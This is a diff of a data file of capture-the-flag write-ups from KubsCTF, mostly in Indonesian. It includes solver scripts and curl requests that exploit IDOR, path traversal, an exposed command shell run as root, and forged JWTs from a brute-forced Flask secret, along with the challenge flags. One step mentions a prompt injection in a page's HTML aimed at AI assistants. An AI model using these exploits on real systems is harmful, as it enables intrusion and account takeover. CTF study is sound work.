'n.c'),\r\n        'Host Computer': ('host', 'YXN0', 'ast')\r\n    }\r\n}\r\n\r\n# The fragments form two main URLs:\r\n# 1. https://kubstu.ru/s-169\r\nkubstu_url = \"htt\" + \"ps:\" + \"//k\" + \"ubs\" + \"tu.\" + \"ru/\" + \"s-1\" + \"69\"\r\nprint(f\"[*] Found URL 1: {kubstu_url}\")\r\n\r\n# 2. https://pastebin.com/\r\npastebin_url = \"htt\" + \"ps:\" + \"//p\" + \"ast\" + \"ebi\" + \"n.c\" + \"om/\"\r\nprint(f\"[*] Found URL 2: {pastebin_url}\")\r\n\r\n# The remaining decoded fragments are 'Csv', 'SuB', 'pK'\r\n# These total exactly 8 characters, matching a Pastebin ID format.\r\npastebin_id = \"SuBCsvpK\"\r\nfinal_url = pastebin_url + \"raw/\" + pastebin_id\r\nprint(f\"[*] Fetching final flag from: {final_url}\")\r\n\r\nresponse = requests.get(final_url)\r\nif response.status_code == 200:\r\n    print(f\"[*] Flag found: {response.text.strip()}\")\r\nelse:\r\n    print(\"[-] Failed to fetch flag from pastebin.\")"
       }
     ],
@@ -853,7 +843,7 @@ export const kubsctfWriteups: WriteUp[] = [
   },
   {
     "id": "kubsuctf-stegano-meowmessage",
-    "title": ": Meow Message (Misc)",
+    "title": "Meow Message (Misc)",
     "category": "Stegano",
     "difficulty": "Medium",
     "points": 0,
@@ -877,7 +867,7 @@ export const kubsctfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "import re\r\n\r\nwith open('message.txt', 'rb') as f:\r\n    lines = f.readlines()\r\n\r\nflag = \"\"\r\nfor line in lines:\r\n    match = re.search(b'([ \\t]+)\\r?\\n$', line)\r\n    if match:\r\n        ws = match.group(1)\r\n        binary = ws.replace(b' ', b'0').replace(b'\\t', b'1')\r\n        if len(binary) == 8:\r\n            flag += chr(int(binary, 2))\r\n        else:\r\n            # In case some lines have more or less than 8 bits\r\n            # but let's see if 8 works for all first\r\n            try:\r\n                flag += chr(int(binary, 2))\r\n            except:\r\n                pass\r\n\r\nprint(flag)"
       }
     ],
@@ -910,21 +900,21 @@ export const kubsctfWriteups: WriteUp[] = [
         "content": "> We are given a text file `ancient_note.txt` — supposedly an ancient manuscript from an abandoned library. The text is in English, philosophical reflections on the search for hidden truth.\n\n**Artifact:** `ancient_note.txt`\n\n---"
       },
       {
-        "title": "Step 1 — Inspect the File",
+        "title": "Inspect the File",
         "content": "Karena challenge hanya memberi satu file teks, langkah pertama yang paling masuk akal adalah memeriksa isi file dan karakteristik dasarnya.\n\nCommand yang dipakai:\n\n\n\nHasil penting yang langsung terlihat:\n\n- File bertipe UTF-8 text dengan line ending CRLF\n- Saat dibuka biasa, teks terlihat seperti narasi bahasa Inggris yang normal\n- Namun di output hex terlihat banyak byte `e2 80 8b` dan `e2 80 8c`\n\nKedua byte sequence itu adalah:\n\n- `U+200B` → Zero Width Space\n- `U+200C` → Zero Width Non-Joiner\n\nIni indikator kuat bahwa flag kemungkinan disisipkan lewat karakter tak terlihat.",
         "code": "file ancient_note.txt\nsed -n '1,200p' ancient_note.txt\nxxd -g 1 ancient_note.txt | sed -n '1,80p'"
       },
       {
-        "title": "Step 2 — Notice the Decoy Layer",
+        "title": "Notice the Decoy Layer",
         "content": "Di bagian kutipan tengah juga ada beberapa huruf yang terlihat normal tetapi sebenarnya memakai Unicode homoglyph dari alfabet Cyrillic, misalnya:\n\n- `о` bukan `o`\n- `е` bukan `e`\n- `І` bukan `I`\n- `і` bukan `i`\n\nLapisan ini tampaknya berfungsi sebagai pengalih perhatian atau petunjuk bahwa file memang memanfaatkan karakter Unicode yang sulit dilihat secara visual.\n\n---"
       },
       {
-        "title": "Step 3 — Extract the Zero-Width Characters",
+        "title": "Extract the Zero-Width Characters",
         "content": "Setelah semua karakter zero-width dikumpulkan, dua karakter itu dipetakan menjadi bit:\n\n- `U+200B` → `0`\n- `U+200C` → `1`\n\nLalu bitstream dibaca per 8 bit sebagai ASCII.\n\nScript Python singkat:\n\n\n\nOutput:",
         "code": "from pathlib import Path\n\ntext = Path(\"ancient_note.txt\").read_text(encoding=\"utf-8\")\nhidden = [ch for ch in text if ch in (\"\\u200b\", \"\\u200c\")]\nbits = \"\".join(\"0\" if ch == \"\\u200b\" else \"1\" for ch in hidden)\nflag = \"\".join(chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8))\nprint(flag)"
       },
       {
-        "title": "Step 4 — Validate the Result",
+        "title": "Validate the Result",
         "content": "Hasil decode langsung membentuk format flag yang valid dan utuh:\n\n\n\nTidak diperlukan brute force, reversing tambahan, ataupun asumsi manual terhadap isi flag.\n\n---",
         "code": "KubSTU{h1dd3n_truth_b3tw33n}"
       },
@@ -939,7 +929,7 @@ export const kubsctfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "from pathlib import Path\r\n\r\n\r\ndef extract_flag(path: str = \"ancient_note.txt\") -> str:\r\n    text = Path(path).read_text(encoding=\"utf-8\")\r\n    hidden = [ch for ch in text if ch in (\"\\u200b\", \"\\u200c\")]\r\n    bits = \"\".join(\"0\" if ch == \"\\u200b\" else \"1\" for ch in hidden)\r\n    return \"\".join(chr(int(bits[i : i + 8], 2)) for i in range(0, len(bits), 8))\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    print(extract_flag())"
       }
     ],
@@ -970,22 +960,22 @@ export const kubsctfWriteups: WriteUp[] = [
         "content": "> In experimental greenhouse No. 3 on the territory of CapyAgro, the control system has failed. Staff engineers cannot access the control panel. Plants are dying. As external auditors, you need to find a way to regain control of the system and return the parameters to normal.\n\n**URL:** `http://45.146.165.92`\n\nMirror:\n- `http://155.212.186.67`\n- `http://62.113.103.24`\n\n---"
       },
       {
-        "title": "Step 1 — Inspect the Frontend Assets",
+        "title": "Inspect the Frontend Assets",
         "content": "Halaman utama menampilkan aplikasi Flask sederhana dengan fitur login dan register. File JavaScript publik di `/static/config.js` langsung membocorkan konfigurasi API:\n\n\n\nDari sini langsung terlihat:\n- ada API key hardcoded di sisi client: `test_key_123`\n- ada endpoint untuk melihat dan mengubah sektor\n- ada endpoint low-level `raw_command`, walau akhirnya tidak diperlukan",
         "code": "window.API_CONFIG = {\n    KEY: 'test_key_123',\n    ENDPOINT: '/api',\n    ENDPOINTS: {\n        sector: (id) => `/api/sector/${id}`,\n        sectorStatus: (number) => `/api/v1/sectors/${number}/status`,\n        adjustSector: (id) => `/api/sector/${id}/adjust`,\n        rawCommand: '/api/v1/raw_command'\n    }\n};"
       },
       {
-        "title": "Step 2 — Register and Log In",
+        "title": "Register and Log In",
         "content": "Setelah membuat akun biasa dan login, aplikasi mengarahkan user ke `/dashboard`. Dashboard ini menampilkan sektor milik user, tetapi JavaScript halaman tersebut juga memperlihatkan bahwa setiap operasi memakai ID numerik internal:\n\n\n\nIni menarik karena ID yang dipakai backend bukan sekadar nomor sektor 1, 2, 3, melainkan primary key internal.",
         "code": "<form onsubmit=\"adjustSector(event, 57)\">\n<form onsubmit=\"adjustSector(event, 58)\">\n<form onsubmit=\"adjustSector(event, 59)\">"
       },
       {
-        "title": "Step 3 — Check CapyAgro Monitoring",
+        "title": "Check CapyAgro Monitoring",
         "content": "Halaman `/capyagro` bisa diakses oleh user biasa dan mengklaim bahwa aksesnya hanya untuk monitoring. Di sana ada petunjuk penting bahwa ID internal bisa dipakai langsung ke endpoint adjust:\n\n\n\nSelain itu ada endpoint yang membocorkan daftar sektor CapyAgro:\n\n\n\nContoh respons:\n\n\n\nRespons ini membocorkan semua yang diperlukan:\n- sektor CapyAgro yang rusak adalah `sector_number: 4`\n- ID internal yang bisa dimodifikasi adalah `id: 70`\n- nilai saat ini berada di luar ambang aman: `temp=30`, `humidity=45`\n\n---",
         "code": "<p><em>Используйте эти ID для управления через API /api/sector/{id}/adjust</em></p>"
       },
       {
-        "title": "Step 4 — Test the Adjust Endpoint Against CapyAgro Sector",
+        "title": "Test the Adjust Endpoint Against CapyAgro Sector",
         "content": "Bug utamanya adalah endpoint penyesuaian tidak membatasi kepemilikan sektor. User biasa tetap bisa mengubah sektor CapyAgro selama mengetahui ID internalnya.\n\nRequest eksploit:\n\n\n\nNilai `24` dan `60` dipilih karena berada di rentang aman yang terlihat konsisten dari dashboard sektor normal.\n\nResponse:\n\n\n\nDi titik ini flag langsung diberikan oleh backend.\n\n---",
         "code": "curl -s http://45.146.165.92/api/sector/70/adjust \\\n  -X POST \\\n  -H 'Content-Type: application/json' \\\n  -H 'X-API-Key: test_key_123' \\\n  -b 'session=<logged-in-session>' \\\n  -d '{\"temp\":24,\"humidity\":60}'"
       },
@@ -1000,12 +990,12 @@ export const kubsctfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\nimport sys\r\nimport uuid\r\n\r\nimport requests\r\n\r\n\r\nBASE_URL = \"http://45.146.165.92\"\r\nAPI_KEY = \"test_key_123\"\r\nSAFE_TEMP = 24\r\nSAFE_HUMIDITY = 60\r\n\r\n\r\ndef main() -> int:\r\n    session = requests.Session()\r\n\r\n    username = f\"u{uuid.uuid4().hex[:8]}\"\r\n    email = f\"{username}@a.a\"\r\n    password = \"Passw0rd!\"\r\n\r\n    register_response = session.post(\r\n        f\"{BASE_URL}/register\",\r\n        data={\"username\": username, \"email\": email, \"password\": password},\r\n        timeout=10,\r\n    )\r\n    register_response.raise_for_status()\r\n\r\n    login_response = session.post(\r\n        f\"{BASE_URL}/login\",\r\n        data={\"username\": username, \"password\": password},\r\n        timeout=10,\r\n        allow_redirects=True,\r\n    )\r\n    login_response.raise_for_status()\r\n\r\n    if \"/dashboard\" not in login_response.url:\r\n        print(\"login failed\", file=sys.stderr)\r\n        return 1\r\n\r\n    headers = {\r\n        \"X-API-Key\": API_KEY,\r\n        \"Content-Type\": \"application/json\",\r\n    }\r\n\r\n    sectors_response = session.get(\r\n        f\"{BASE_URL}/api/capyagro/sectors\",\r\n        headers=headers,\r\n        timeout=10,\r\n    )\r\n    sectors_response.raise_for_status()\r\n    sectors = sectors_response.json().get(\"sectors\", [])\r\n    if not sectors:\r\n        print(\"no CapyAgro sectors returned\", file=sys.stderr)\r\n        return 1\r\n\r\n    sector_id = sectors[0][\"id\"]\r\n    adjust_response = session.post(\r\n        f\"{BASE_URL}/api/sector/{sector_id}/adjust\",\r\n        headers=headers,\r\n        json={\"temp\": SAFE_TEMP, \"humidity\": SAFE_HUMIDITY},\r\n        timeout=10,\r\n    )\r\n    adjust_response.raise_for_status()\r\n\r\n    payload = adjust_response.json()\r\n    flag = payload.get(\"flag\")\r\n    if not flag:\r\n        print(\"flag not found in response\", file=sys.stderr)\r\n        print(payload, file=sys.stderr)\r\n        return 1\r\n\r\n    print(flag)\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
       }
     ],
     "terminalOutputs": [],
-    "flag": "```text\nKubSTU(Sav3d_th3_CapyArg0S3ct0r)\n```\n\n---",
+    "flag": "KubSTU{Sav3d_th3_CapyArg0S3ct0r}",
     "lessonsLearned": ""
   },
   {
@@ -1018,7 +1008,7 @@ export const kubsctfWriteups: WriteUp[] = [
     "author": "Nattt",
     "ctfName": "KubsCTF",
     "tags": [],
-    "description": "Challenge ini kelihatannya sederhana di permukaan: kita dikasih satu akun biasa dan sebuah ID admin yang menyimpan secret. Setelah login sebagai user biasa, aplikasi memaksa masuk ke halaman 2FA. Tapi 2FA ini ternyata cuma hiasan frontend, karena backend tetap menerima token JWT dari hasil login pertama.",
+    "description": "",
     "problemDescription": "Challenge ini kelihatannya sederhana di permukaan: kita dikasih satu akun biasa dan sebuah ID admin yang menyimpan secret. Setelah login sebagai user biasa, aplikasi memaksa masuk ke halaman 2FA. Tapi 2FA ini ternyata cuma hiasan frontend, karena backend tetap menerima token JWT dari hasil login pertama.",
     "tools": [],
     "analysis": "Halaman login melakukan request ke endpoint berikut:\n\n```http\nPOST /login\nContent-Type: application/json\n\n{\"username\":\"angel\",\"password\":\"princess\"}\n```\n\nResponse login memberi JWT dan mengarahkan user ke `/2fa`.\n\nDi halaman `/2fa`, ada petunjuk penting di JavaScript:\n\n- console log membocorkan endpoint internal `POST /admin/account/<id>`\n- ada fungsi `getAccountData(id)` yang mengirim body `{\"action\":\"fetch_secure_data\"}`\n\nArtinya, walaupun 2FA belum selesai, browser tetap bisa mengakses endpoint admin account selama punya token JWT dari login biasa.",
@@ -1038,13 +1028,8 @@ export const kubsctfWriteups: WriteUp[] = [
         "code": "/admin/account/679202372644%2f..%2f239716013"
       },
       {
-        "title": "Exploit final",
-        "content": "Request final:\n\n\n\nResponse:",
-        "code": "POST /admin/account/679202372644%2f..%2f239716013\nAuthorization: Bearer <jwt_user_biasa>\nContent-Type: application/json\n\n{\"action\":\"fetch_secure_data\"}"
-      },
-      {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\nimport sys\r\nimport requests\r\n\r\n\r\nTARGETS = [\r\n    \"http://155.212.132.248\",\r\n    \"http://83.222.27.64\",\r\n]\r\nUSERNAME = \"angel\"\r\nPASSWORD = \"princess\"\r\nADMIN_ID = \"239716013\"\r\nTRAVERSAL_PAYLOAD = \"679202372644%2f..%2f239716013\"\r\n\r\n\r\ndef login(session: requests.Session, base_url: str) -> dict:\r\n    response = session.post(\r\n        f\"{base_url}/login\",\r\n        json={\"username\": USERNAME, \"password\": PASSWORD},\r\n        timeout=10,\r\n    )\r\n    response.raise_for_status()\r\n    data = response.json()\r\n    if \"token\" not in data:\r\n        raise RuntimeError(\"Login berhasil tapi token tidak ditemukan\")\r\n    return data\r\n\r\n\r\ndef fetch_flag(session: requests.Session, base_url: str, token: str) -> str:\r\n    response = session.post(\r\n        f\"{base_url}/admin/account/{TRAVERSAL_PAYLOAD}\",\r\n        headers={\r\n            \"Authorization\": f\"Bearer {token}\",\r\n            \"Content-Type\": \"application/json\",\r\n        },\r\n        json={\"action\": \"fetch_secure_data\"},\r\n        timeout=10,\r\n    )\r\n    response.raise_for_status()\r\n    data = response.json()\r\n    flag = data.get(\"data\", \"\")\r\n    if not flag:\r\n        raise RuntimeError(f\"Respons tidak memuat data flag: {data}\")\r\n    return flag\r\n\r\n\r\ndef main() -> int:\r\n    for base_url in TARGETS:\r\n        try:\r\n            session = requests.Session()\r\n            login_data = login(session, base_url)\r\n            token = login_data[\"token\"]\r\n            flag = fetch_flag(session, base_url, token)\r\n            print(f\"[+] Target   : {base_url}\")\r\n            print(f\"[+] User ID  : {login_data.get('user_id')}\")\r\n            print(f\"[+] Admin ID : {ADMIN_ID}\")\r\n            print(f\"[+] Flag     : {flag}\")\r\n            return 0\r\n        except Exception as exc:\r\n            print(f\"[-] Gagal di {base_url}: {exc}\", file=sys.stderr)\r\n    return 1\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
       }
     ],
@@ -1076,22 +1061,22 @@ export const kubsctfWriteups: WriteUp[] = [
         "content": "> Lately, the theme change is buggy. Maybe it's because of the bugs? Did the site work the same way before?\n\n**URL:** `http://193.42.127.24`  \n**Mirror:** `http://159.194.209.128`  \n**Mirror:** `http://159.194.199.71`\n\n---"
       },
       {
-        "title": "Step 1 — Check the Main Page and Basic Behavior",
+        "title": "Check the Main Page and Basic Behavior",
         "content": "Halaman utama menampilkan blog sederhana berbasis PHP dengan fitur:\n\n- ganti tema lewat `?set_theme=dark`\n- login dan register\n- komentar pada tiap post\n\nDari header dan error handling awal kelihatan aplikasi berjalan di:\n\n- `Apache/2.4.66 (Debian)`\n- `PHP/8.2.30`\n\nSaat `set_theme` diisi nilai array seperti:\n\n\n\nserver membocorkan stack trace:\n\n\n\nIni berguna karena mengonfirmasi path aplikasi di server: `/var/www/html/`.",
         "code": "curl \"http://193.42.127.24/?set_theme[]=dark\""
       },
       {
-        "title": "Step 2 — Trigger More Errors to Map Internal Files",
+        "title": "Trigger More Errors to Map Internal Files",
         "content": "Input array juga bisa dipakai pada login dan register:\n\n\n\nServer kembali membocorkan informasi internal:\n\n\n\nDengan teknik yang sama pada komentar:\n\n\n\nmuncul file helper lain:\n\n\n\nPada tahap ini sudah terlihat struktur aplikasi:\n\n- `index.php`\n- `login.php`\n- `register.php`\n- `auth.php`\n- `utils.php`\n- `config.php`",
         "code": "curl -X POST http://193.42.127.24/login.php \\\n  -d \"username[]=a&password=b\""
       },
       {
-        "title": "Step 3 — Content Discovery",
+        "title": "Content Discovery",
         "content": "Dari `robots.txt` terlihat ada petunjuk:\n\n\n\nItu menunjukkan ada versi lama atau file cadangan, jadi saya lanjut enumerasi file yang tidak terlihat dari UI.  \nSaat melakukan discovery terhadap file `.php`, ditemukan endpoint yang tidak ter-link dari aplikasi:\n\n\n\nMembuka endpoint itu tanpa parameter langsung menghasilkan error sangat jelas:\n\n\n\nDari sini langsung kelihatan implementasinya secara praktis setara dengan:\n\n\n\nArtinya ada **unauthenticated command execution**.\n\n---",
         "code": "User-agent: *\nDisallow: /backup/"
       },
       {
-        "title": "Step 4 — Confirm RCE",
+        "title": "Confirm RCE",
         "content": "Tes sederhana:\n\n\n\nResponse:\n\n\n\nJadi command dieksekusi sebagai `root`.",
         "code": "curl \"http://193.42.127.24/shell.php?c=id\""
       },
@@ -1106,12 +1091,12 @@ export const kubsctfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\nimport re\r\nimport sys\r\nimport urllib.parse\r\n\r\nimport requests\r\n\r\n\r\nTARGETS = [\r\n    \"http://193.42.127.24\",\r\n    \"http://159.194.209.128\",\r\n    \"http://159.194.199.71\",\r\n]\r\n\r\nFLAG_RE = re.compile(r\"KubSTU\\([^)]+\\)\")\r\n\r\n\r\ndef run_cmd(base_url: str, command: str) -> str:\r\n    url = f\"{base_url}/shell.php?c={urllib.parse.quote(command, safe='')}\"\r\n    response = requests.get(url, timeout=15, verify=False)\r\n    response.raise_for_status()\r\n    return response.text\r\n\r\n\r\ndef find_shell_target() -> str:\r\n    for base_url in TARGETS:\r\n        try:\r\n            response = requests.get(f\"{base_url}/shell.php\", timeout=10, verify=False)\r\n        except requests.RequestException:\r\n            continue\r\n        if \"Undefined array key \\\"c\\\"\" in response.text and \"system()\" in response.text:\r\n            return base_url\r\n    raise RuntimeError(\"shell.php not found on any target\")\r\n\r\n\r\ndef main() -> int:\r\n    requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]\r\n\r\n    try:\r\n        base_url = find_shell_target()\r\n        output = run_cmd(base_url, \"cat /var/www/html/data/flag.txt\")\r\n    except Exception as exc:\r\n        print(f\"[!] exploit failed: {exc}\", file=sys.stderr)\r\n        return 1\r\n\r\n    match = FLAG_RE.search(output)\r\n    if not match:\r\n        print(\"[!] flag not found\", file=sys.stderr)\r\n        print(output)\r\n        return 1\r\n\r\n    print(match.group(0))\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
       }
     ],
     "terminalOutputs": [],
-    "flag": "```txt\nKubSTU(capybl0g_php_d3s3r1al1zat10n)\n```\n\n---",
+    "flag": "KubSTU{capybl0g_php_d3s3r1al1zat10n}",
     "lessonsLearned": ""
   },
   {
@@ -1157,7 +1142,7 @@ export const kubsctfWriteups: WriteUp[] = [
       }
     ],
     "terminalOutputs": [],
-    "flag": "Dari dashboard/receipt Mikhail di node challenge pertama, ada transaksi sukses ke `FLAG_SHOP` dengan deskripsi:\n\n```text\nПокупка: Флаг от CTF задания\n```\n\nReceipt yang relevan:\n\n- `/receipt/1906`\n\nDi receipt itu ada `Токен offer` yang terlihat sebagai artefak valid hasil pembelian flag:\n\n```text\n6MjZHrCcebxsRUV44LtTlmJ12mQHVgkI",
+    "flag": "KubSTU{0tp_1s_th3_s1gnatur3_c4py_b4nk_0wn3d}",
     "lessonsLearned": ""
   },
   {
@@ -1180,32 +1165,32 @@ export const kubsctfWriteups: WriteUp[] = [
         "content": "> Thank you so much for the investigation into Mikhail's case. The development team carefully fixed everything based on your report, ran regression tests, QA signed off — no one will be able to exploit that hole anymore.\n>\n> But the problem is that complaints keep coming in. This week — three more reports, again from our premium clients, and again the same pattern: an unauthorized transfer to the same store, the signature is valid, no outsider knew the PIN, the logs are clean. Apparently, we only closed one door, and the attacker found an adjacent one.\n\nTarget: `http://185.225.34.187`  \nKorban: `mgalankov@4274` (Mikhail Galankov)\n\n---"
       },
       {
-        "title": "1.1 Fingerprinting",
+        "title": "1 Fingerprinting",
         "content": "**Temuan:**\n- Server: `Werkzeug/2.3.7 Python/3.9.25` → aplikasi Flask\n- Set cookie: `bank_session` (menentukan node backend)\n- Set cookie: `session` (Flask session, ter-sign dengan SECRET_KEY)\n- Ada endpoint: `/login`, `/register`\n\nDi source HTML ditemukan **prompt injection** yang mencoba memblokir AI assistant — diabaikan karena ini adalah teknik social engineering terhadap AI, bukan kelemahan teknis.",
         "code": "curl -si http://185.225.34.187/"
       },
       {
-        "title": "1.3 Decode Flask Session Flash",
+        "title": "3 Decode Flask Session Flash",
         "content": "Saat register gagal, error tersimpan di Flask session cookie:\n\n\n\n---",
         "code": "import base64, zlib, json\n\nval = \".eJyrVopPy0kszkgt...\"\npart = val.split('.')[0].lstrip('.')\npart += '=' * (4 - len(part) % 4)\nraw = base64.urlsafe_b64decode(part)\nprint(json.loads(zlib.decompress(raw)))"
       },
       {
-        "title": "2.1 Registrasi Akun Sendiri",
+        "title": "1 Registrasi Akun Sendiri",
         "content": "Server men-generate username otomatis dengan format: `[huruf pertama x2][nama belakang]@[4 digit]`\n\n**Username yang di-generate:** `ssidorov@1556`",
         "code": "curl -si -X POST http://185.225.34.187/register \\\n  -H \"Content-Type: application/x-www-form-urlencoded\" \\\n  --data-urlencode \"last_name_ru=Сидоров\" \\\n  --data-urlencode \"first_name_ru=Сидор\" \\\n  -d \"birth_date=1992-03-15\" \\\n  --data-urlencode \"driver_license_number=55ДЕ667788\" \\\n  --data-urlencode \"driver_license_issued_by=ГИБДД г. Москвы\" \\\n  -d \"email=sidor@test.ru&password=Test1234&pin_code=12345678\" \\\n  -c cook.txt -b cook.txt -L"
       },
       {
-        "title": "2.2 Login",
+        "title": "2 Login",
         "content": "**JWT yang diterima:**\n\n\nDecode payload JWT:\n\n\n---",
         "code": "curl -si -X POST http://185.225.34.187/login \\\n  -H \"Content-Type: application/x-www-form-urlencoded\" \\\n  -d \"username=ssidorov@1556&password=Test1234\" \\\n  -c cook.txt -b cook.txt -L"
       },
       {
-        "title": "3.1 Instalasi flask-unsign",
+        "title": "1 Instalasi flask-unsign",
         "content": "",
         "code": "pip install flask-unsign --break-system-packages"
       },
       {
-        "title": "3.2 Bruteforce Secret",
+        "title": "2 Bruteforce Secret",
         "content": "**Secret ditemukan:** `ifeveryonecared3`\n\n> **Catatan:** Di soal 1, secret-nya adalah `facetoface`. Tim developer sudah mengganti secret, tapi masih menggunakan secret yang lemah dan ada di wordlist umum.\n\n---",
         "code": "flask-unsign \\\n  --wordlist /usr/share/wordlists/rockyou.txt \\\n  --unsign \\\n  --cookie \".eJyrVopPy0kszkgtVrKKrlZSKAFSSsWl...\" \\\n  --no-literal-eval"
       },
@@ -1215,12 +1200,12 @@ export const kubsctfWriteups: WriteUp[] = [
         "code": "import jwt, time\n\nsecret = \"ifeveryonecared3\"\npayload = {\n    \"fresh\": False,\n    \"iat\": int(time.time()),\n    \"jti\": \"aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee\",\n    \"type\": \"access\",\n    \"sub\": \"4\",           # user_id Mikhail\n    \"nbf\": int(time.time()),\n    \"exp\": int(time.time()) + 3600,\n    \"username\": \"mgalankov@4274\"\n}\ntoken = jwt.encode(payload, secret, algorithm=\"HS256\")\nprint(token)"
       },
       {
-        "title": "6.1 Endpoint Signature",
+        "title": "1 Endpoint Signature",
         "content": "Response:\n\n\n**Perbedaan kritis dari soal 1:**\n- Di soal 1: signature disimpan di **session cookie** (bisa di-forge karena secret lemah)\n- Di soal 2: signature **dikembalikan langsung** sebagai JSON response → tidak ada di session",
         "code": "curl -s -X POST http://185.225.34.187/api/get_signature \\\n  -b cook.txt \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"to_account\":\"FLAG_SHOP\",\"amount\":1000,\"description\":\"flag\",\"pin_code\":\"12345678\"}'"
       },
       {
-        "title": "6.2 Kerentanan Ditemukan: Signature Tidak Terikat ke User",
+        "title": "2 Kerentanan Ditemukan: Signature Tidak Terikat ke User",
         "content": "Server **tidak memverifikasi** apakah signature yang disubmit dibuat oleh user yang sama dengan yang melakukan transfer. Artinya:\n\n- Kita bisa generate signature dengan **akun kita sendiri** (PIN kita = `12345678`)\n- Signature tersebut bisa dipakai untuk transfer **atas nama Mikhail** (menggunakan JWT Mikhail)\n\nIni adalah kerentanan **Broken Object Level Authorization (BOLA/IDOR)** pada mekanisme signature.\n\n---"
       },
       {
@@ -1229,17 +1214,17 @@ export const kubsctfWriteups: WriteUp[] = [
         "code": "<form method=\"POST\" action=\"/transfer\" id=\"skipPinForm\" style=\"display: none;\">\n    <input type=\"hidden\" name=\"skip_pin\" value=\"1\">\n    <input type=\"hidden\" name=\"to_account\" value=\"FLAG_SHOP\">\n    <input type=\"hidden\" name=\"amount\" value=\"1000.0\">\n    <input type=\"hidden\" name=\"description\" value=\"Покупка: Флаг от CTF задания\">\n</form>\n\n<button type=\"button\" id=\"skipPinBtn\">Отказаться от PIN</button>"
       },
       {
-        "title": "8.1 Dapatkan Offer Token",
+        "title": "1 Dapatkan Offer Token",
         "content": "Dari Telegram bot `@flagi_and_bagi_for_kubstu2bot`:",
         "code": "/start\n/token\n→ TOKEN: ADxER3TV7WWeu6NSg8h2YTojOUJc0HZk"
       },
       {
-        "title": "8.2 Generate Signature (Akun Kita)",
+        "title": "2 Generate Signature (Akun Kita)",
         "content": "",
         "code": "SIG_RESP=$(curl -s -X POST http://185.225.34.187/api/get_signature \\\n  -b cook.txt \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"to_account\":\"FLAG_SHOP\",\"amount\":1000,\"description\":\"Покупка: Флаг от CTF задания\",\"pin_code\":\"12345678\"}')\n\nSIG=$(echo $SIG_RESP | python3 -c \"import sys,json;d=json.load(sys.stdin);print(d['signature'])\")\nTS=$(echo $SIG_RESP | python3 -c \"import sys,json;d=json.load(sys.stdin);print(d['timestamp'])\")"
       },
       {
-        "title": "8.3 Submit Transfer AS Mikhail (Cross-User Signature Abuse)",
+        "title": "3 Submit Transfer AS Mikhail (Cross-User Signature Abuse)",
         "content": "Response:",
         "code": "curl -si -X POST http://185.225.34.187/transfer \\\n  --cookie \"access_token_cookie=$MIKHAIL_JWT\" \\\n  -H \"Content-Type: application/x-www-form-urlencoded\" \\\n  --data-urlencode \"to_account=FLAG_SHOP\" \\\n  --data-urlencode \"amount=1000.0\" \\\n  --data-urlencode \"description=Покупка: Флаг от CTF задания\" \\\n  --data-urlencode \"product_id=1\" \\\n  --data-urlencode \"token=$TOKEN_BARU\" \\\n  -d \"transaction_signature=$SIG&transaction_timestamp=$TS\""
       },
@@ -1302,17 +1287,17 @@ export const kubsctfWriteups: WriteUp[] = [
         "code": "nc 155.212.217.42 5000\nnc 159.194.199.67 5000\nnc 31.128.47.156 5000"
       },
       {
-        "title": "Step 1 — Identify the Protocol",
+        "title": "Identify the Protocol",
         "content": "Percobaan pertama menggunakan `curl` biasa ke port 5000 menghasilkan timeout tanpa response apapun:\n\n\n\nKarena soal memberikan alamat `nc`, dicoba koneksi raw TCP:\n\n\n\nServer berhasil connect tapi tidak mengirim apapun — mengindikasikan server menunggu input terlebih dahulu.",
         "code": "curl -sv --max-time 5 http://155.212.217.42:5000/"
       },
       {
-        "title": "Step 2 — Identifikasi Perilaku \"Deadlock\"",
+        "title": "Identifikasi Perilaku \"Deadlock\"",
         "content": "Sesuai judul challenge **\"Deadlock\"** dan hint *\"Frontend to backend\"*, dicurigai bahwa:\n- Terdapat **dua service terpisah** di IP berbeda\n- Server **frontend** menunggu request masuk, lalu meneruskan ke **backend**\n- Keduanya harus di-trigger **bersamaan** untuk mendapat response\n\nPengujian dengan mengirim request ke dua IP berbeda secara bersamaan:\n\n\n\nTerminal 2 mendapatkan response:\n\n\n\nIni mengkonfirmasi arsitektur **frontend–backend** yang terpisah di dua IP berbeda.\n\n---",
         "code": "printf \"GET /admin HTTP/1.0\\r\\nHost: 155.212.217.42\\r\\n\\r\\n\" | nc -v 155.212.217.42 5000\n\nprintf \"GET /admin HTTP/1.0\\r\\nHost: 155.212.217.42\\r\\n\\r\\n\" | nc -v 159.194.199.67 5000"
       },
       {
-        "title": "Step 3 — Bypass Admin Restriction",
+        "title": "Bypass Admin Restriction",
         "content": "Dari screenshot Burp Suite yang terlihat di foto, ditemukan bahwa request ke `admin.challenge.local:8081` menggunakan header `X-Admin-Access: true`. Header ini dicoba ditambahkan ke request:",
         "code": "printf \"GET /admin HTTP/1.0\\r\\nHost: 155.212.217.42\\r\\nX-Admin-Access: true\\r\\n\\r\\n\" | nc -v 155.212.217.42 5000\n\nprintf \"GET /admin HTTP/1.0\\r\\nHost: 159.194.199.67\\r\\nX-Admin-Access: true\\r\\n\\r\\n\" | nc -v 159.194.199.67 5000"
       },
@@ -1402,12 +1387,12 @@ export const kubsctfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solver.py) is provided below:",
+        "content": "",
